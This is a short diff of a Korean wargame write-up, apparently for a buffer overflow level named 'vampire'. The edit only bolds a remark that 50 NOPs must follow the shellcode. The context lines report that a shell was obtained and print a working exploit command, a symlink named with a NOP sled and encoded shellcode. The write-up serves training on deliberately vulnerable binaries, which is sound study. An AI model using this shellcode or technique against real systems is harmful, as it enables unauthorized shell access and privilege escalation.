@@ -336,7 +336,7 @@ Reading symbols from /lib/ld-linux.so.2...done.
 
 ret 값을 `0xbfffff33`주소로 변경하여 exploit 시도 결과 `shell`을 획득할 수 있었다.
 
-여기서 주의할 점은 사용된 쉘코드의 특성상 쉘코드 뒤에 `shell+nop[50]`을 추가해줘야 한다.
+**_여기서 주의할 점은 사용된 쉘코드의 특성상 쉘코드 뒤에 `shell+nop[50]`을 추가해줘야 한다._**
 
 ```python
 [vampire@localhost vampire]$ ln -s skeleton `python -c "print '\x90'*100+'\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81'+'\x90'*50"`
